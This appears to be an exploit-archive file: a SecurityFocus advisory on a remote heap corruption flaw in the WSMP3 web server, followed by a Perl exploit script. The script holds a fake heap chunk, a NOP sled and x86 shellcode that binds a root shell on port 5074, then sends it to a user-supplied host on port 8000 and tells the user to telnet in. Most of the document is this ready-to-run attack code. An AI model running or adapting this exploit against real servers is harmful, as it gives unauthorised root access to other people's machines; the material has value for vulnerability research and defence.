@@ -1,0 +1,141 @@
+source: http://www.securityfocus.com/bid/6240/info
+
+A remotely exploitable heap corruption vulnerability has been reported for WSMP3.
+
+Due to insufficient bounds checking of user-supplied input, it is possible for a remote attacker to corrupt heap memory. By corrupting allocated memory headers, it is possible to redirect program flow when the free() function is called.
+
+Successful exploitation of this issue may result in remote execution of arbitrary code with root privileges.
+
+
+#!/usr/bin/perl -w
+#
+#
+# Remote Heap malloc/free & multiple Overflow vulnerability in WSMP3.
+# Bug found by; dong-h0un U
+# Exploit Coded By; Damian Myerscough
+#
+# visit: www.securityfreaks.com
+# visit: http://x82.i21c.net
+#
+# 0x02. Vulnerable Packages
+# =-=-=-=-=-=-=-=-=-=-=-=-=
+#
+# Vendor site: http://wsmp3.sourceforge.net/
+#
+# web_server-0.0.6
+# -web_server-0.0.6.tar.gz
+# +RedHat Linux 6.x
+# web_server-0.0.5 (exploitable)
+# -web_server-0.0.5.tar.gz
+# web_server-0.0.4
+# -web_server-0.0.4.tar.gz
+# web_server-0.0.3
+# -web_server-0.0.3.tar.gz.gz
+# wsmp3-0.0.2
+# -web_server-0.0.2.tar.gz
+# web_server-v.0.0.1
+# -web_server.tar.gz
+#
+# Tested On Redhat 6.1 (cartman)
+#
+#
+
+use IO::Socket;
+
+$Shellcode = "\x41\x41\x41\x41". # offset
+"\x41\x41\x41\x41". # offset
+"\x41\x41\x41\x41". # offset
+"\x41\x41\x41\x41". # offset 16 bytes
+"\xfc\xff\xff\xff". # chunk header
+"\xff\xff\xff\xff". # ""
+"\xa0\x1b\x05\x08". # 0x08051bac-12
+"\xd0\x7b\xff\xbf". # 0xbfff7bd0
+"\x20". # ' '
+"\x90\x90\x90\x90\x90\x90\x90\x90". # nop
+"\xeb\x0c\xeb\x0c\xeb\x0c\xeb\x0c". # nop 12 bytes jumpcode
+"\x90\x90\x90\x90\x90\x90\x90\x90". # nop
+"\x90\x90\x90\x90\x90\x90\x90\x90". # nop
+#Shellcode Binds a port on 5074 This shellcode is 92 bytes
+"\x31\xc0".
+"\x50".
+"\x40".
+"\x89\xc3".
+"\x50".
+"\x40".
+"\x50".
+"\x89\xe1".
+"\xb0\x66".
+"\xcd\x80".
+"\x31\xd2".
+"\x52".
+"\x66\x68\x13\xd2".
+"\x43".
+"\x66\x53".
+"\x89\xe1".
+"\x6a\x10".
+"\x51".
+"\x50".
+"\x89\xe1".
+"\xb0\x66".
+"\xcd\x80".
+"\x40".
+"\x89\x44\x24\x04".
+"\x43".
+"\x43".
+"\xb0\x66".
+"\xcd\x80".
+"\x83\xc4\x0c".
+"\x52".
+"\x52".
+"\x43".
+"\xb0\x66".
+"\xcd\x80".
+"\x93".
+"\x89\xd1".
+"\xb0\x3f".
+"\xcd\x80".
+"\x41".
+"\x80\xf9\x03".
+"\x75\xf6".
+"\x52".
+"\x68\x6e\x2f\x73\x68".
+"\x68\x2f\x2f\x62\x69".
+"\x89\xe3".
+"\x52".
+"\x53".
+"\x89\xe1".
+"\xb0\x0b".
+"\xcd\x80";
+
+print"+==========================================+\n";
+print" Remote Heap malloc/free WSMP3 \n";
+print" Coded By; Damian Myerscough \n";
+print" Bug found By; dong-h0un U \n";
+print" Offset done By; dong-h0un U \n";
+print"+==========================================+\n\n";
+
+print"Enter a Host: ";
+$Host = <STDIN>;
+chop($Host);
+
+# First connect.
+$Socket = IO::Socket::INET->new(Proto =>"tcp",
+PeerAddr =>$Host,
+PeerPort =>8000) || die "Could not connect
+to $Host \n";
+
+print"Sending Fake Chunk.\n";
+print $Socket "$Shellcode";
+close($Socket);
+
+# Second connect.
+$Socket = IO::Socket::INET->new(Proto =>"tcp",
+PeerAddr =>$Host,
+PeerPort =>8000) || die "Could not connect
+to $Host \n";
+print"Sending Shellcode.\n";
+print $Socket "$Shellcode";
+close($Socket);
+
+print"Binded port.\n";
+print"Telnet to $Host at port 5074\n";
